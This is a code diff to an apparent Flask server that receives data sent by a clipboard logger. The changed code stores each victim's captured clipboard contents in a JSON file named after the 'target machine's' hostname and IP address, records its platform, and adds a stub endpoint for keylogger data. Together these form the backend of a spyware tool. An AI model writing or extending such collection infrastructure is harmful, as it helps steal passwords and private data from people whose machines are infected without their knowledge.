@@ -5,32 +5,38 @@ Description: Receives data from the clipboard logger and
 Author: Benjamin Norman 2023
 '''
 
+
+
 from flask import app, request, Flask, Response
 import json
-import time
+from datetime import datetime
 import os
 
-# Variables to change
-key = "API KEY CHANGE ME"
-hostedPort = 8080
-
+from env import *
 
 app = Flask(__name__)
 
-def file_upload(data):
+def file_upload(data, ipAddress, hostname, platform):
     
-    capturedData = {"data":"", "timestamp": 0.0}
+    current_time_utc = datetime.utcnow()
+    # Format the time in ISO 8601 format
+    formattedDateTime = current_time_utc.isoformat()    
+    
+    capturedData = {"data":"", "timestamp": "0.0"}
     capturedData["data"] = data
-    capturedData["timestamp"] = time.time()
+    capturedData["timestamp"] = formattedDateTime
 
-    with open("captured_data.json", 'r+') as f:
+    # TODO Change the file name to that of the hostname of the target machine
+    if not os.path.exists(f"clipboard_{hostname}_{ipAddress}.json"):
+        with open(f"clipboard_{hostname}_{ipAddress}.json", 'w'): pass
+    with open(f"clipboard_{hostname}_{ipAddress}.json", 'r+') as f:
         try:
             file_data = json.load(f)
         except json.decoder.JSONDecodeError:
-            file_data = {"data":[]}
+            file_data = {"Hostname":hostname, "IP Address":ipAddress, "Platform":platform, "data":[]}
             
         file_data["data"].append(capturedData)
-        f.seek(0) # Resets the pointer to teh start of the file
+        f.seek(0) # Resets the pointer to the start of the file
         json.dump(file_data, f, indent=4)
         f.close()
 
@@ -39,20 +45,34 @@ def clipboard_incoming():
     if request.method == 'POST':
         jsonData = request.get_json()
         
-        if jsonData["key"] == key:
-            file_upload(jsonData["data"])
+        '''
+        Filter by request
+        
+        Add the data to the relevant hostname JSON file
+        along with a timestamp of when it was received.
+        
+        Due to the limited amount of requests that will be made at once
+        no need to batch load them.
+        
+        '''
+        
+        if jsonData["apiKey"] == APIKEY:
+            file_upload(jsonData["data"], jsonData["ipAddress"], jsonData["hostname"], jsonData["platform"])
             return 'Successful'
         else:
             return Response('Invalid API key', status=400)
     else:
         return Response('Invalid request method', status=400)
+    
+@app.route('/keylogger_incoming', methods=['POST'])
+def keylogger_incoming():
+        
+        '''
+        Due to the amount of data that could be coming in, these will JSON dicts
+        that will need extracting into a seperate JSON file associated with the hostname
+        '''
+        pass
  
 if __name__ == '__main__':
     
-    ### Checks to see if all files are there ###
-    
-    if os.path.exists("captured_data.json") != True:
-        file = open("captured_data.json", "w")
-        file.close()
-    
-    app.run(port=hostedPort)
+    app.run(port=SERVERPORT)
